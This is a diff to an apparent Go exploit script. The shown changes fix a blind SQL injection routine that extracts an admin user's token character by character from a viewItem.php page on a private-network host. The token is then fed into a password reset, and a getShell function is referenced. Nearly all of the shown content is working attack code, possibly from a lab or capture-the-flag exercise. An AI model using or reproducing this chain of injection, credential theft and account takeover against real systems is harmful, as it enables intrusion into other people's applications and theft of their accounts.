@@ -12,18 +12,16 @@ import (
 )
 
 func getToken(ip string) string {
-	c := make(chan int)
 	var result []rune = make([]rune, 15)
 	strings := []rune("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
 	for i := 0; i < 15; i++ {
-
 		for _, v := range strings {
-			url := fmt.Sprint("http://" + ip + "/item/viewItem.php?id=-1%20union%20select%201,2,3,4,5,token%20from%20user%20where%20ascii(substring(token," + strconv.Itoa(j+1) + ",1))=" + strconv.Itoa(int(v)) + "%20and%20id_level=1")
+			url := fmt.Sprint("http://" + ip + "/item/viewItem.php?id=-1%20union%20select%201,2,3,4,5,token%20from%20user%20where%20ascii(substring(token," + strconv.Itoa(i+1) + ",1))=" + strconv.Itoa(int(v)) + "%20and%20id_level=1")
 			resp, _ := http.Get(url)
 			if resp.StatusCode == 404 {
-				result[j] = v
-				fmt.Println(string(v), "", j)
-				c <- 1
+				result[i] = v
+				fmt.Println(string(v), "", i)
+
 				break
 			}
 		}
@@ -114,7 +112,7 @@ func getShell(urli, port, ip string) {
 }
 
 func main() {
-	
+
 	token := getToken("192.168.0.100")
 	fmt.Println(token)
 	err := resetPassword(token, "123456", "192.168.0.100")
